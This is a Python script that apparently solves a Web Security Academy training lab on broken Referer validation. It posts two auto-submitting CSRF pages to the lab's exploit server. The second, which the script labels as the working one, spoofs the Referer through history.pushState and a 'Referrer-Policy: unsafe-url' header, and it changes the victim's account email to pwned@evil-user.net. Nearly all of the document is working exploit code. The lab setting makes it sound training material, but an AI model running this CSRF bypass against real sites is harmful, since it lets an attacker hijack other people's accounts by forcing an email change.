#referer-validation-broken
#  1. change-email without Referer set (denied)
#  2. change-email with Referer set to {site} (allowed)
#  3. Then need to change HTML on exploit server to make it so victim appears to come in from {site}
import requests
import sys
from bs4 import BeautifulSoup
import urllib.parse
site = 'ac531f3c1ef8897bc07436ff0079008f.web-security-academy.net'
login_url = f'https://{site}/login'
logindata = {
    'username' : 'wiener',
    'password' : 'peter'
}
input('Login via script with no referer:')
resp = requests.post(login_url, data=logindata)
print(f'HTTP status code: {resp.status_code} with response text {resp.text}')

input('\nLogin via script with referer set to login page:')
resp = requests.post(login_url, data=logindata, headers={'referer' : login_url})
print(f'HTTP status code: {resp.status_code}')

#==============================================================
# Non-working exploit
input("Exploit that does not set referer\nLogin then view exploit:")
s = requests.Session()
url = f'https://{site}/login'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_html = f'''<html>
  <body>
	<form action="https://{site}/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="pwned@evil-user.net" />
	</form>
	<script>
  	document.forms[0].submit();
	</script>
  </body>
</html>'''
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)

#==============================================================
# Working exploit
input("Exploit that sets referer to account page\nAutomatically kills exploit server:")
referer_url = f'https://{site}/my-account'
exploit_html = f'''<html>
  <body>
	<form action="https://{site}/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="pwned@evil-user.net" />
	</form>
	<script>
    history.pushState("", "", "/?{referer_url}")
  	document.forms[0].submit();
	</script>
  </body>
</html>'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nReferrer-Policy: unsafe-url',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)